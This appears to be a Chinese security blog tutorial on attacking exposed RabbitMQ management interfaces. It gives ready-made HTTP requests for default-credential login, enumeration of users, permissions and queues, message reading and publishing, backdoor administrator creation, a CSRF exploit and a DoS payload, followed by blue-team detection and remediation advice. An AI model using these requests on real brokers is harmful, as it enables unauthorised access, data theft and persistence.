---
title: "RabbitMQ消息队列管理面打点与HTTP API利用技术"
date: 2026-06-16T09:43:43+08:00
draft: false
weight: 68
description: "围绕RabbitMQ消息队列相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "消息队列", "RabbitMQ", "HTTP API"]
---

# RabbitMQ消息队列管理面打点与HTTP API利用技术

`RabbitMQ` 是典型的高价值消息队列控制平面。它不只是一个 AMQP 服务端口，而是同时汇聚了：

- 集群节点、Erlang 节点名与集群健康状态
- vhost、user、permission、topic permission 与 user tag
- queue、exchange、binding、policy、parameter 与 runtime parameter
- connection、channel、consumer、message rate 与内存水位
- Management UI、HTTP API、definitions 导入导出、Shovel/Federation 扩展面

对攻击者来说，RabbitMQ 的价值不在某一个页面，而在它经常可以一次性暴露：

- 内部业务系统使用的队列名、交换机名与 routing key
- 多租户 vhost 划分与环境命名
- 应用账号、管理账号与权限边界
- 当前客户端连接来源 IP、客户端库、consumer 分布
- Federation、Shovel、上游 URI 与跨集群复制关系
- definitions 导出的完整拓扑与权限模型

一旦 `rabbitmq_management` 插件暴露在低信任网络、命名账号弱口令、历史旧版管理面缺陷仍未修复、反向代理允许错误来源转发、或者某个管理用户权限过宽，攻击者往往可以在很短时间内建立完整消息链路画像，并进一步转向：

- 业务主题与事件流命名回收
- 内部应用账号和访问模式识别
- 队列消息探测、测试发布与消费
- definitions 导出和拓扑还原
- Federation / Shovel / Policy 相关的跨环境线索扩展

本文聚焦打点与利用侧，重点记录：

1. 如何识别当前目标是否为 RabbitMQ 管理面
2. 如何围绕 `Management UI` 与 `HTTP API` 建立拓扑画像
3. 如何从 `vhost/user/permission/queue/exchange/connection/definitions` 判断真实风险
4. 哪些请求与响应最值得完整留档
5. 蓝队如何从访问日志、认证失败日志、连接日志与管理 API 痕迹识别这类打点

---

## 0. 攻击面概览

### 0.1 常见端口与路径

首轮至少应枚举：

- `5672/tcp`
- `15672/tcp`
- `15671/tcp`
- `/`
- `/api/overview`
- `/api/cluster-name`
- `/api/nodes`
- `/api/vhosts`
- `/api/users`
- `/api/permissions`
- `/api/queues`
- `/api/exchanges`
- `/api/bindings`
- `/api/connections`
- `/api/channels`
- `/api/consumers`
- `/api/definitions`

如果启用了扩展插件，还应继续关注：

- `/api/federation-links`
- `/api/parameters/federation-upstream`
- `/api/shovels`
- `/api/extensions`
- `/cli/rabbitmqadmin`

### 0.2 认证边界

RabbitMQ 管理面最常见的认证边界包括：

- 标准 RabbitMQ 用户数据库配合 `HTTP Basic Auth`
- 默认 `guest/guest`
- 默认 `guest` 仅允许 loopback 本地访问
- 用户 tag 区分 `management`、`monitoring`、`policymaker`、`administrator`
- vhost 级 `configure`、`write`、`read` 权限

这意味着实战中必须同时判断两层权限：

1. 当前用户是否能登录管理面
2. 当前用户登录后能看哪些 vhost、对象和消息操作

### 0.3 打点收益优先级

按“最快转成真实攻击价值”的顺序，RabbitMQ 的打点收益一般可排为：

1. 确认是否为 RabbitMQ 管理面、管理插件是否开启、管理端口是否可达
2. 验证弱口令或误开放的管理用户，读取 `overview`、`nodes`、`vhosts`
3. 枚举 `users`、`permissions`、`queues`、`exchanges`、`bindings`
4. 枚举 `connections`、`channels`、`consumers` 与当前业务连接分布
5. 判断 `definitions` 导出、测试发布/消费、Federation/Shovel 扩展面是否可继续放大收益

---

## 1. 第一轮打点：确认是否为 RabbitMQ

### 1.1 管理首页识别

#### 请求示例

```http
GET / HTTP/1.1
Host: mq.target.example:15672
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html
Server: Cowboy
WWW-Authenticate: Basic realm="RabbitMQ Management"
```

页面或响应特征中常见：

- `RabbitMQ Management`
- `Basic realm="RabbitMQ Management"`
- `rabbitmq`
- `Cowboy`

### 1.2 `GET /api/overview`

`overview` 是 RabbitMQ 管理面最适合作为首轮识别的接口之一。

#### 请求示例

```http
GET /api/overview HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
Accept: application/json
Connection: close
```

#### 典型成功响应示例

```json
{
  "management_version": "4.3.0",
  "rates_mode": "basic",
  "rabbitmq_version": "4.3.0",
  "cluster_name": "rabbit@mq-prod-01",
  "erlang_version": "26.2.5",
  "object_totals": {
    "channels": 84,
    "connections": 28,
    "consumers": 43,
    "exchanges": 217,
    "queues": 162
  },
  "queue_totals": {
    "messages": 81932,
    "messages_ready": 81720,
    "messages_unacknowledged": 212
  }
}
```

#### 典型失败响应示例

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="RabbitMQ Management"
Content-Type: application/json
```

```json
{
  "error": "not_authorised",
  "reason": "Login failed"
}
```

这条接口的价值在于它能直接告诉你：

- 管理插件确实已启用
- RabbitMQ 与管理插件版本
- 集群名与 Erlang 版本
- 连接、通道、消费者、队列与消息总量

### 1.3 `guest/guest` 的现实边界

官方访问控制文档明确说明：

- 默认存在 `guest` 用户
- 默认密码是 `guest`
- 该用户默认只能从 loopback 本地地址连接

因此实战里要区分两种情况：

- 远程 `guest/guest` 直接成功：通常意味着配置被明显放宽
- 远程 `guest/guest` 失败但日志出现 loopback 限制：说明目标确实是 RabbitMQ，且默认用户尚未完全暴露

#### 典型日志示例

```text
[error] <0.918.0> PLAIN login refused: user 'guest' can only connect via localhost
```

### 1.4 `GET /api/cluster-name`

#### 请求示例

```http
GET /api/cluster-name HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "name": "rabbit@mq-prod-01"
}
```

这一步适合用于快速确认：

- 集群命名规范
- 节点命名是否暴露主机名
- 后续日志与证书中的节点名关联

---

## 2. 第二轮打点：节点、vhost 与基础拓扑

### 2.1 `GET /api/nodes`

#### 请求示例

```http
GET /api/nodes HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "rabbit@mq-prod-01",
    "type": "disc",
    "running": true,
    "mem_used": 684912640,
    "fd_used": 1210,
    "proc_used": 389743,
    "sockets_used": 812,
    "uptime": 98522432
  },
  {
    "name": "rabbit@mq-prod-02",
    "type": "disc",
    "running": true,
    "mem_used": 701665280,
    "fd_used": 1098,
    "proc_used": 376441,
    "sockets_used": 736,
    "uptime": 98521877
  }
]
```

这类响应会直接暴露：

- 节点数量与名称
- 是否为集群
- 内存、文件描述符、socket 使用情况
- 是否存在容量压力或被动暴露的资源瓶颈

### 2.2 `GET /api/vhosts`

RabbitMQ 是多租户系统，`vhost` 是后续所有对象枚举的关键起点。

#### 请求示例

```http
GET /api/vhosts HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "/",
    "description": "default vhost",
    "tags": [],
    "default_queue_type": "classic",
    "tracing": false
  },
  {
    "name": "payment-prod",
    "description": "payment production",
    "tags": [
      "critical"
    ],
    "default_queue_type": "quorum",
    "tracing": false
  }
]
```

vhost 列表非常适合回收：

- 生产 / 测试 / 审计 / B2B 环境划分
- 多租户命名规则
- 默认队列类型与运行策略

### 2.3 默认 vhost `/` 的 URL 编码

官方 HTTP API 文档明确指出默认 vhost 名称是 `/`，因此路径里必须编码为 `%2F`。这一点在自动化打点脚本里非常关键。

#### 请求示例

```http
GET /api/queues/%2F HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

如果脚本错误地把默认 vhost 直接写成 `/`，往往会导致：

- 404
- 路径解析混乱
- 误判为接口不存在

---

## 3. 第三轮打点：用户、权限与高价值对象

### 3.1 `GET /api/users`

#### 请求示例

```http
GET /api/users HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "mqadmin",
    "tags": [
      "administrator"
    ],
    "limits": {}
  },
  {
    "name": "monitor",
    "tags": [
      "monitoring"
    ],
    "limits": {}
  },
  {
    "name": "payment-api",
    "tags": [],
    "limits": {}
  }
]
```

用户列表的价值在于：

- 暴露运维管理账号命名
- 暴露应用账号名称
- 判断当前是否存在高权限管理账号
- 为后续权限矩阵判断提供基础

### 3.2 `GET /api/permissions`

#### 请求示例

```http
GET /api/permissions HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "user": "payment-api",
    "vhost": "payment-prod",
    "configure": "^payment\\.",
    "write": "^payment\\.",
    "read": "^payment\\."
  },
  {
    "user": "mqadmin",
    "vhost": "/",
    "configure": ".*",
    "write": ".*",
    "read": ".*"
  }
]
```

权限矩阵一旦可读，攻击收益会迅速放大，因为它能直接说明：

- 哪些账号只属于某个业务线
- 哪些账号能跨 vhost 使用
- 权限是否以正则表达式限定到某些命名空间
- 是否存在实际上的“全通配符”账号

### 3.3 `GET /api/topic-permissions`

如果环境使用 topic exchange，topic permission 同样是高价值边界。

#### 请求示例

```http
GET /api/topic-permissions HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "user": "partner-sync",
    "vhost": "b2b-prod",
    "exchange": "partner.topic",
    "write": "^partner\\.",
    "read": "^partner\\."
  }
]
```

这类数据特别适合判断：

- 哪些消息路由键是外部合作接口
- 哪些事件前缀有隔离设计
- 是否存在主题级过宽授权

### 3.4 `GET /api/queues/{vhost}`

#### 请求示例

```http
GET /api/queues/payment-prod?disable_stats=true&columns=name,durable,auto_delete,exclusive,arguments,node HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "payment.command.create",
    "durable": true,
    "auto_delete": false,
    "exclusive": false,
    "arguments": {
      "x-queue-type": "quorum",
      "x-dead-letter-exchange": "payment.dlx"
    },
    "node": "rabbit@mq-prod-01"
  },
  {
    "name": "payment.event.refund",
    "durable": true,
    "auto_delete": false,
    "exclusive": false,
    "arguments": {},
    "node": "rabbit@mq-prod-02"
  }
]
```

这一步几乎可以直接还原：

- 业务事件命名
- 死信交换机设计
- quorum/classic 使用习惯
- 哪些队列看起来属于同步命令，哪些属于异步事件

### 3.5 `GET /api/exchanges/{vhost}`

#### 请求示例

```http
GET /api/exchanges/payment-prod?disable_stats=true&columns=name,type,durable,auto_delete,internal,arguments HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "payment.events",
    "type": "topic",
    "durable": true,
    "auto_delete": false,
    "internal": false,
    "arguments": {}
  },
  {
    "name": "payment.dlx",
    "type": "direct",
    "durable": true,
    "auto_delete": false,
    "internal": false,
    "arguments": {}
  }
]
```

交换机列表的价值在于：

- 暴露业务消息总线命名
- 暴露是否存在延迟、死信、重试等模式
- 暴露主题与直连混用结构

### 3.6 `GET /api/bindings/{vhost}`

#### 请求示例

```http
GET /api/bindings/payment-prod HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "source": "payment.events",
    "vhost": "payment-prod",
    "destination": "payment.event.refund",
    "destination_type": "queue",
    "routing_key": "payment.refund.created",
    "arguments": {}
  }
]
```

绑定关系一旦可见，打点价值会超过单独的 queue/exchange 列表，因为它直接揭示：

- 事件流向
- routing key 命名结构
- 哪些队列消费哪些业务主题

---

## 4. 第四轮打点：连接、通道、消费者与实时业务画像

### 4.1 `GET /api/connections`

#### 请求示例

```http
GET /api/connections HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "10.20.41.18:51422 -> 10.20.41.30:5672",
    "user": "payment-api",
    "vhost": "payment-prod",
    "peer_host": "10.20.41.18",
    "peer_port": 51422,
    "host": "10.20.41.30",
    "port": 5672,
    "protocol": "AMQP 0-9-1",
    "client_properties": {
      "product": "amqp091-go",
      "platform": "go1.22.4"
    },
    "state": "running"
  }
]
```

这一类响应常常是 RabbitMQ 专题里最有实战价值的部分之一，因为它会直接暴露：

- 真实客户端源 IP
- 使用中的应用账号
- 客户端库与开发语言
- 当前连接到哪个 vhost

### 4.2 `GET /api/channels`

#### 请求示例

```http
GET /api/channels HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "10.20.41.18:51422 -> 10.20.41.30:5672 (1)",
    "user": "payment-api",
    "vhost": "payment-prod",
    "connection_name": "10.20.41.18:51422 -> 10.20.41.30:5672",
    "number": 1,
    "prefetch_count": 200,
    "consumer_count": 6
  }
]
```

通道信息通常帮助判断：

- 某个应用是生产者还是消费者
- 并发消费能力
- prefetch 是否设置异常

### 4.3 `GET /api/consumers`

#### 请求示例

```http
GET /api/consumers/payment-prod HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "queue": {
      "name": "payment.event.refund",
      "vhost": "payment-prod"
    },
    "channel_details": {
      "connection_name": "10.20.41.18:51422 -> 10.20.41.30:5672",
      "peer_host": "10.20.41.18",
      "user": "payment-api"
    },
    "consumer_tag": "ctag-pymq.7f0d1fd0f2e04c7f89cc",
    "ack_required": true,
    "exclusive": false
  }
]
```

消费者面会把以下信息串起来：

- 哪个应用在消费哪个队列
- 源地址是什么
- ack 模式如何
- 是否存在独占消费者

---

## 5. 第五轮打点：高风险控制面与历史利用链

### 5.1 `GET /api/definitions`

官方文档明确指出 definitions 导出包含：

- exchanges
- queues
- bindings
- users
- virtual hosts
- permissions
- topic permissions
- parameters

也就是“除了消息体之外的几乎全部拓扑与权限模型”。

#### 请求示例

```http
GET /api/definitions HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Accept: application/json
Connection: close
```

#### 典型响应片段示例

```json
{
  "rabbit_version": "4.3.0",
  "users": [
    {
      "name": "mqadmin",
      "password_hash": "x3z9fOe6...",
      "hashing_algorithm": "rabbit_password_hashing_sha256",
      "tags": "administrator"
    }
  ],
  "vhosts": [
    {
      "name": "payment-prod"
    }
  ],
  "permissions": [
    {
      "user": "payment-api",
      "vhost": "payment-prod",
      "configure": "^payment\\.",
      "write": "^payment\\.",
      "read": "^payment\\."
    }
  ],
  "queues": [
    {
      "name": "payment.event.refund",
      "vhost": "payment-prod",
      "durable": true,
      "arguments": {}
    }
  ]
}
```

如果这一步可读，攻击者几乎就已经拿到了完整控制平面蓝图。

### 5.2 测试发布 `POST /api/exchanges/{vhost}/{name}/publish`

#### 请求示例

```http
POST /api/exchanges/payment-prod/payment.events/publish HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Content-Type: application/json
Connection: close

{
  "properties": {},
  "routing_key": "payment.refund.created",
  "payload": "{\"orderId\":\"R20260616001\",\"amount\":188.50}",
  "payload_encoding": "string"
}
```

#### 典型响应示例

```json
{
  "routed": true
}
```

这类接口的风险不在“能发一条测试消息”，而在于：

- 可以验证业务拓扑真实可用性
- 可以触发下游消费者
- 可以构造告警、任务、状态同步等业务副作用

### 5.3 测试取消息 `POST /api/queues/{vhost}/{name}/get`

#### 请求示例

```http
POST /api/queues/payment-prod/payment.event.refund/get HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Content-Type: application/json
Connection: close

{
  "count": 1,
  "ackmode": "ack_requeue_true",
  "encoding": "auto",
  "truncate": 50000
}
```

#### 典型响应示例

```json
[
  {
    "payload_bytes": 61,
    "redelivered": false,
    "exchange": "payment.events",
    "routing_key": "payment.refund.created",
    "message_count": 381,
    "properties": {
      "content_type": "application/json",
      "delivery_mode": 2
    },
    "payload": "{\"orderId\":\"R20260615073\",\"amount\":88.60,\"status\":\"created\"}",
    "payload_encoding": "string"
  }
]
```

这一条接口是实战中极具破坏性的信息获取点，因为它可能直接暴露：

- 真实业务消息体
- 订单号、用户标识、流水号、回调参数
- 下游业务状态变化语义

### 5.4 Definitions 导入与对象修改

HTTP API 中大量 `PUT` / `POST` 操作都能直接改写拓扑，例如：

- `PUT /api/vhosts/{name}`
- `PUT /api/users/{name}`
- `PUT /api/permissions/{vhost}/{user}`
- `PUT /api/queues/{vhost}/{name}`
- `PUT /api/exchanges/{vhost}/{name}`
- `POST /api/definitions`

#### 请求示例

```http
PUT /api/users/rootadmin HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Content-Type: application/json
Connection: close

{
  "password": "RootAdmin123!",
  "tags": "administrator"
}
```

#### 典型响应示例

```http
HTTP/1.1 201 Created
```

一旦这些写操作可用，风险已从“打点”直接升级为：

- 新增管理员
- 改写业务拓扑
- 创建后门账号
- 大范围导入恶意 definitions

### 5.5 历史利用链：管理界面 CSRF 新增管理员

公开的 `Exploit-DB 44902` 记录过旧版 RabbitMQ 管理界面存在可用于新增管理员的 CSRF 攻击链。本质上是已登录管理用户被诱导访问恶意页面后，由浏览器自动向管理 API 发起 `POST /api/users/{username}`。

#### 恶意请求等价示例

```http
POST /api/users/rootadmin HTTP/1.1
Host: mq.target.example:15672
Cookie: m=logged-in-session
Content-Type: application/x-www-form-urlencoded
Connection: close

username=rootadmin&password=rootadmin&tags=administrator
```

#### 典型结果

```http
HTTP/1.1 201 Created
```

这类历史链条的意义在于提醒：

- 管理面不是只有弱口令风险
- 已登录管理员浏览器本身就是攻击面
- 反向代理、CSRF 防护和版本更新同样重要

### 5.6 历史风险：`CVE-2023-46118` HTTP API 大请求体 DoS

2023 年 RabbitMQ 披露过 `CVE-2023-46118`，核心问题是 HTTP API 未强制请求体大小限制，具备足够权限的用户可通过 HTTP API 发送超大消息，最终造成节点资源耗尽。

#### 请求示例

```http
POST /api/exchanges/%2F/amq.default/publish HTTP/1.1
Host: mq.target.example:15672
Authorization: Basic bXFhZG1pbjpBZG1pbjEyMyE=
Content-Type: application/json
Connection: close

{
  "properties": {},
  "routing_key": "bulk.queue",
  "payload": "<very large body omitted>",
  "payload_encoding": "string"
}
```

这条风险对实战的重要意义在于：

- 管理 API 不只是读配置
- 具备写权限的账号还能触发资源型攻击
- 大消息发布异常本身也是重要蓝队告警点

### 5.7 Federation / Shovel 的扩展风险

如果启用了相关插件，还应重点检查：

- `federation upstream` 配置
- `shovel` 参数
- 相关管理 UI 扩展页
- definitions 导出中的上游 URI

这是因为相关历史风险表明：

- 旧版本曾出现 UI XSS
- URI 混淆与日志泄漏可能把敏感连接信息暴露到错误日志
- 一旦管理面失守，跨集群复制链路会成为二次打点入口

---

## 6. 蓝队日志与处置

### 6.1 HTTP API 访问日志

官方管理插件文档明确提到支持 HTTP API 请求日志。排查时应优先关注：

- `/api/overview`
- `/api/nodes`
- `/api/vhosts`
- `/api/users`
- `/api/permissions`
- `/api/queues`
- `/api/exchanges`
- `/api/bindings`
- `/api/connections`
- `/api/consumers`
- `/api/definitions`
- `/api/exchanges/*/publish`
- `/api/queues/*/get`

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:21:14:03 +0800] "GET /api/overview HTTP/1.1" 200 812 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:21:14:11 +0800] "GET /api/definitions HTTP/1.1" 200 48173 "-" "python-requests/2.32.3"
```

#### 日志示例

```text
10.10.10.21 - - [16/Jun/2026:21:14:21 +0800] "POST /api/queues/payment-prod/payment.event.refund/get HTTP/1.1" 200 1143 "-" "python-requests/2.32.3"
```

如果同一来源在短时间内连续完成：

- `overview`
- `vhosts`
- `users`
- `permissions`
- `definitions`
- `queue get`

则基本可判定为结构化消息中间件打点。

### 6.2 认证失败与默认 `guest` 日志

RabbitMQ 官方文档明确给出了默认 `guest` 的 loopback 限制日志样式，这在排查公网撞库时非常有用。

#### 日志示例

```text
2026-06-16 21:12:44.153698+08:00 [error] <0.1567.0> PLAIN login refused: user 'guest' can only connect via localhost
```

#### 日志示例

```text
2026-06-16 21:12:48.513102+08:00 [warning] <0.1621.0> HTTP access denied: user 'mqadmin' - invalid credentials
```

应特别关注：

- 远程 `guest` 尝试
- 对管理账号的短时间连续错误认证
- 成功登录后随即大量读取 `definitions`、`users`、`permissions`

### 6.3 连接与客户端行为排查

RabbitMQ 的连接与通道信息本身就是调查数据源。蓝队应在异常时重点检查：

- 新出现的 `peer_host`
- 非办公网段的管理来源
- 非预期客户端库
- 短时间创建大量通道与消费者

#### 日志示例

```text
2026-06-16 21:15:12.771+08:00 [info] <0.20123.0> accepting AMQP connection <0.20123.0> (10.20.41.18:51422 -> 10.20.41.30:5672)
```

#### 日志示例

```text
2026-06-16 21:15:13.107+08:00 [info] <0.20123.0> connection <0.20123.0> (10.20.41.18:51422 -> 10.20.41.30:5672): user 'payment-api' authenticated and granted access to vhost 'payment-prod'
```

### 6.4 处置建议

发现 RabbitMQ 管理面被打点后，应优先做：

1. 立即收敛 `15672/15671` 的暴露范围，只允许运维网段访问
2. 删除或禁用默认 `guest`，轮换所有管理账号与应用账号密码
3. 检查是否已有 `definitions` 被导出、是否发生 `publish` 或 `queue get`
4. 审查 `users`、`permissions`、`topic permissions`、`user tags` 是否被新增或改写
5. 检查 Federation、Shovel、Policy、Parameter 是否存在异常配置
6. 核查版本是否落在 `CVE-2023-46118`、旧版 CSRF、管理 UI XSS 等风险区间

长期建议：

- 管理插件不直接暴露公网
- 管理账号与业务账号分离，按 vhost 最小授权
- 定期审计 `definitions`、`users`、`permissions` 与异常连接来源
- 对 `GET /api/definitions`、`POST /api/*/publish`、`POST /api/*/get` 建立独立告警
- 不使用默认账号，删除测试账号和历史临时管理员

---

## 7. 复盘清单

### 7.1 红队侧

- 是否确认了管理插件是否启用以及版本信息
- 是否完整记录了 `overview`、`nodes`、`vhosts`、`users`、`permissions` 请求与响应
- 是否建立了 queue、exchange、binding 与 routing key 画像
- 是否验证了 `connections`、`channels`、`consumers` 与实时业务关系
- 是否确认 `definitions`、测试发布/消费、Federation/Shovel 的真实风险边界

### 7.2 蓝队侧

- 是否能识别从 `overview -> vhosts -> users -> permissions -> definitions` 的连续访问链
- 是否能识别 `guest` 远程尝试与命名管理账号的异常认证
- 是否能识别对消息读取、测试发布与 definitions 导出的操作
- 是否能关联 HTTP API 来源、AMQP 连接来源与下游业务异常

### 7.3 应急侧

- 是否确认是否已有拓扑、权限模型和连接关系被导出
- 是否确认是否已有消息被测试读取或伪造发布
- 是否完成了高权限用户、vhost 权限、Federation/Shovel 配置的收敛
- 是否完成版本升级和管理面暴露面的基线复核

---

## 8. 总结

`RabbitMQ` 的真正风险，不只是“一个消息队列管理页面可以访问”，而在于它会把：

- 用户与权限
- vhost 与多租户边界
- 队列、交换机与绑定关系
- 客户端连接与消费者分布
- definitions 拓扑与参数
- Federation / Shovel 扩展链路

统一暴露给同一套 `Management UI` 与 `HTTP API`。

对打点来说，更值得沉淀的方法学是：

- 先确认管理插件与认证边界
- 再建立 vhost、user、permission、queue、exchange、binding 画像
- 再回收 connection、channel、consumer 的实时业务关系
- 最后集中验证 `definitions`、测试发布/取消息与扩展插件面

只有把这些对象串成完整链条，才能把“RabbitMQ 管理面暴露”真正转化成结构化攻击价值判断。

---

## 参考资料

- [RabbitMQ Management Plugin](https://www.rabbitmq.com/docs/management)
- [RabbitMQ HTTP API Reference](https://www.rabbitmq.com/docs/http-api-reference)
- [RabbitMQ Access Control](https://www.rabbitmq.com/docs/access-control)
- [RabbitMQ Virtual Hosts](https://www.rabbitmq.com/docs/vhosts)
- [rabbitmqadmin v2](https://www.rabbitmq.com/docs/management-cli)
- [Exploit-DB 44902](https://www.exploit-db.com/exploits/44902)
- [CVE-2023-46118](https://app.opencve.io/cve/CVE-2023-46118)
- [CVE-2022-31008](https://app.opencve.io/cve/CVE-2022-31008)
- [CVE-2021-32719](https://app.opencve.io/cve/CVE-2021-32719)
